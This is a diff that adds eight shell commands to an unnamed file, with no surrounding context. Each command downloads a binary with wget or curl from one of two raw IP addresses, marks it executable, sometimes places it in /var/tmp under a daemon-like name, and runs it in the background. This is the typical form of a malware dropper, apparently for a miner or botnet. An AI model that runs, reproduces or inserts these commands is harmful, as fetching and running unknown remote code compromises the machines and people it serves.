@@ -1,0 +1,8 @@
+wget http://54.80.233.39/m.x86 -O mx86 ; chmod +x mx86 ; chmod 700 mx86 ; ./mx86 &
+wget http://52.38.10.78/udevdd -O m5 ; chmod +x m5 ; chmod 700 m5 ; ./m5 &
+curl -z mx86 http://54.80.233.39/m.x86 ; chmod +x mx86 ; chmod 700 mx86 ; ./mx86 &
+curl -z m5 http://52.38.10.78/udevdd ; chmod +x m5 ; chmod 700 m5 ; ./m5 &
+wget http://54.80.233.39/m.x86 -O /var/tmp/mx86 ; chmod +x /var/tmp/mx86 ; chmod 700 /var/tmp/mx86 ; /var/tmp/mx86 &
+curl -z /var/tmp/mx86 http://54.80.233.39/m.x86 ; chmod +x /var/tmp/mx86 ; chmod 700 /var/tmp/mx86 ; /var/tmp/mx86 &
+wget http://52.38.10.78/udevdd -O /var/tmp/m5 ; chmod +x /var/tmp/m5 ; chmod 700 /var/tmp/m5 ; /var/tmp/m5 &
+curl -z /var/tmp/m5 http://54.80.233.39/m.x86 ; chmod +x /var/tmp/m5 ; chmod 700 /var/tmp/m5 ; /var/tmp/m5 &
